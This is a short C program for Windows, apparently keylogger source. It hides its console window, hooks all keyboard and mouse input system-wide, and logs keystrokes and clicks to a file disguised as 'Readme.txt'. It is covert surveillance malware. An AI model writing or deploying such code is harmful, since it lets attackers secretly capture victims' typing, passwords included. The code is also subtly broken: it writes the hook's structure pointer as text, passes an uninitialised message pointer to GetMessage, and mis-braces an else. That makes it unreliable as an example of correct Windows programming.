#include <stdio.h>
#include <windows.h>
#include <winuser.h>

HHOOK hook;
HHOOK MouseHook;
LPMSG msg;
FILE *LOG;
FILE *LOG1;

void Stealth()
{
    HWND Stealth=GetConsoleWindow();
    ShowWindow(Stealth,SW_HIDE);
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    LOG = fopen("Readme.txt", "a+");
    if (wParam == WM_KEYDOWN)
    {
    	fputs((char *)lParam, LOG);
    	fclose(LOG);

    }
    return CallNextHookEx(hook,code,wParam,lParam);
}
LRESULT CALLBACK MouseProc(int code1, WPARAM wParam1, LPARAM lParam1){
    LOG1 = fopen("Readme.txt", "a+");
    if (wParam1 == WM_RBUTTONDOWN)
    {
    	fputs(" [RIGHT-CLICK] ", LOG1);
    	fclose(LOG1);

    }
    else if(wParam1==WM_LBUTTONDOWN){
    	fputs(" [LEFT-CLICK] ",LOG1);
    	fclose(LOG1);
	}
    return CallNextHookEx(hook,code1,wParam1,lParam1);
}


int main() {
	Stealth();
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	MouseHook = SetWindowsHookEx(WH_MOUSE_LL,MouseProc,NULL,0);
	if (hook != NULL) 
		puts("[!]Success");
	else
		system("COLOR 2");
		puts("[!] Error creating hook");
	while(GetMessage(msg, NULL, 0, 0) > 0) {
    	TranslateMessage(msg);
    	DispatchMessage(msg);
	}
	
	return 0;
}
